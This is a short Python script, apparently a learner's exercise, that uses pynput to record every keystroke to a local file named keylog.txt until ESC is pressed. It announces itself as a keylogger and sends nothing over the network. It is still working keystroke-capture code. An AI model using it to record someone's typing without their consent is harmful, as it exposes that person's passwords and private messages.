from pynput import keyboard

print("Script started")  #  Add this here

log_file = "keylog.txt"

def on_press(key):
    try:
        with open(log_file, "a") as f:
            f.write(key.char)
    except AttributeError:
        if key == keyboard.Key.space:
            with open(log_file, "a") as f:
                f.write(" ")
        elif key == keyboard.Key.enter:
            with open(log_file, "a") as f:
                f.write("\n")
        else:
            with open(log_file, "a") as f:
                f.write(f"[{key.name}]")

def on_release(key):
    if key == keyboard.Key.esc:
        print("Logging stopped.")
        return False

print("Keylogger started... Press ESC to stop.")  # Optional extra message

with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
